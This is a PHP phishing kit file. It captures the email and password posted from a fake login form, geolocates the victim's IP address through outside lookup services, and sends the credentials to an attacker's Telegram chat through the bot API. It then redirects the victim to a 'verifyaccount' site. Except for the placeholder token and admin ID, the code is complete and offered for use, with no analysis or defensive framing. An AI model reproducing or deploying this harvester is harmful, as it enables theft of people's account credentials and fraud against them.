<?php
ob_start();
$API_KEY = "YOUR TOKEN";

define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $tbbots = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$tbbots";
        $ttktt = file_get_contents($url);
        return json_decode($ttktt);
}
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
date_default_timezone_set('Asia/Baghdad');
$time = date('h:i');
$year = date('Y');
$month = date('n');
$day = date('j');
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$name = $message->from->first_name;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$user = $message->from->username;

$admin = "YOUR ID";
$email = $_POST["email"];
$password = $_POST["password"];
$login = $_POST["login"];


if($email){
$url1 = "http://www.verifyaccount.xyz/index.php?uc=L";
header("location: $url1");
$geo = json_decode(file_get_contents("https://extreme-ip-lookup.com/json/".$ip));
$cty = $geo->country;
$cdt = json_decode(file_get_contents("https://api.ipgeolocationapi.com/geolocate/".$ip));
$ccode = $cdt->country_code;
$name = $message->from->first_name;

if(strpos($email , " ") !== false or strpos($email , "ض") !== false or strpos($email , "ص") !== false or strpos($email , "ث") !== false or strpos($email , "ق") !== false or strpos($email , "ف") !== false or strpos($email , "غ") !== false or strpos($email , "ع") !== false or strpos($email , "ه") !== false or strpos($email , "خ") !== false or strpos($email , "ح") !== false or strpos($email , "ج") !== false or strpos($email , "ش") !== false or strpos($email , "س") !== false or strpos($email , "ي") !== false or strpos($email , "ب") !== false or strpos($email , "ل") !== false or strpos($email , "ا") !== false or strpos($email , "ت") !== false or strpos($email , "ن") !== false or strpos($email , "م") !== false or strpos($email , "ك") !== false or strpos($email , "ة") !== false or strpos($email , "ظ") !== false or strpos($email , "ط") !== false or strpos($email , "ذ") !== false or strpos($email , "د") !== false or strpos($email , "ز") !== false or strpos($email , "ر") !== false or strpos($email , "و") !== false or strpos($email , "آ") !== false or strpos($email , "إ") !== false or strpos($email , "أ") !== false or strpos($email , "گ") !== false or strpos($email , "ى") !== false or strpos($email , "ؤ") !== false or strpos($email , "ء") !== false or strpos($email , "١") !== false or strpos($email , "٢") !== false or strpos($email , "٣") !== false or strpos($email , "٤") !== false or strpos($email , "٥") !== false or strpos($email , "٦") !== false or strpos($email , "٧") !== false or strpos($email , "٨") !== false or strpos($email , "٩") !== false or strpos($email , "٠") !== false or strpos($email , "#") !== false or strpos($email , "$") !== false or strpos($email , "&") !== false or strpos($email , "=") !== false or strpos($email , "%") !== false or strpos($email , "*") !== false or strpos($email , ":") !== false or strpos($email , "/") !== false or strpos($email , "!") !== false or strpos($email , "?") !== false or strpos($email , "+") !== false or strpos($email , "¿") !== false or strpos($email , "¡") !== false or strpos($email , "×") !== false){
$url1 = "http://www.verifyaccount.xyz/index.php?uc=L";
header("location: $url1");
	} else{
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
𝒀𝑶𝑼 𝑯𝑨𝑽𝑬 𝑨 𝑵𝑬𝑾 𝑳𝑶𝑮𝑰𝑵

👤 ¦ 𝑬𝒎𝒂𝒊𝒍 » `$email`
📟 ¦ 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅  » `$password`
☎️ ¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆 » `+$ccode`
🔱 ¦ 𝑳𝒐𝒈𝒊𝒏 » $login
👁️‍🗨️ ¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 » $cty
⏱ ¦ 𝑻𝒊𝒎𝒆 » $time
📝 ¦ 𝑫𝒂𝒕𝒆 » $day/$month/$year
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}
} 
?>
<html>
  <head>
    <meta http-equiv="refresh" content="0; url='http://www.verifyaccount.xyz/index.php?uc=L'" />
    <script type="text/javascript">
            window.location.href = "http://www.verifyaccount.xyz/index.php?uc=L"
    </script>
 </head>
  <body>
  </body>
</html>
